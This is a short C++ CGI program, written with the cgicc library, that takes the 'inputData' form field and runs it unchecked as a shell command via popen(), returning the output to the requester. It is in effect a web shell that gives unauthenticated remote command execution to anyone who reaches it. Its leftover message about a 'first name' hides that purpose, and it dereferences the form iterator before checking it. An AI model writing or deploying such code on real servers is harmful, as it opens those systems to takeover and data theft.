#include <iostream>
#include <vector>  
#include <string>  
#include <stdio.h>  

#include <stdlib.h> 
#include <cgicc/CgiDefs.h> 
#include <cgicc/Cgicc.h> 
#include <cgicc/HTTPHTMLHeader.h> 

#include <cgicc/HTMLClasses.h>  
#include <memory>
#include <cstdio>
#include <stdexcept>
#include <string>
#include <array>

using namespace std;
using namespace cgicc;


std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);

    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

int main () {
   Cgicc formData;
   cout << "Content-type:text/plain\r\n\r\n";
   form_iterator fi = formData.getElement("inputData");  
  
   if( !fi->isEmpty() && fi != (*formData).end()) {  
      string  p;
        p = **fi;

      cout << exec(p.c_str());
   } else {
      cout << "No text entered for first name" << endl;  
   }
   return 0;
}
